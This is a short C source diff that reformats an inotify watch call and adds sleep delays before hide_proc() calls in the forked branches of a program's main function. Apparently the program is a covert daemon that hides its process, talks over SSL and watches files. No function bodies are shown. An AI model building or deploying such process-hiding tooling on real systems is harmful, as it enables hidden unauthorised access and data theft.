@@ -367,8 +367,7 @@ void handle_inotify_ignore(struct inotify_event* ie) {
             //Found the watch descriptor, re-add it
             int wd;
 
-            if ((wd = inotify_add_watch(
-                         *inot_fd, inot_wds[j].name, IN_CLOSE_WRITE | IN_IGNORED))
+            if ((wd = inotify_add_watch(*inot_fd, inot_wds[j].name, IN_CLOSE_WRITE | IN_IGNORED))
                     < 0) {
                 perror("read inotify_add_watch");
                 exit(EXIT_FAILURE);
@@ -624,6 +623,7 @@ int main(void) {
 
     if (!wrapped_fork()) {
         promote_child();
+        sleep(1);
         hide_proc();
         epoll_event_loop(ssl);
     } else {
@@ -634,10 +634,12 @@ int main(void) {
 
         if (wrapped_fork()) {
             setsid();
+            sleep(2);
             hide_proc();
             ssl_read_event_loop(ssl);
         } else {
             setsid();
+            sleep(3);
             hide_proc();
             inotify_event_loop();
         }
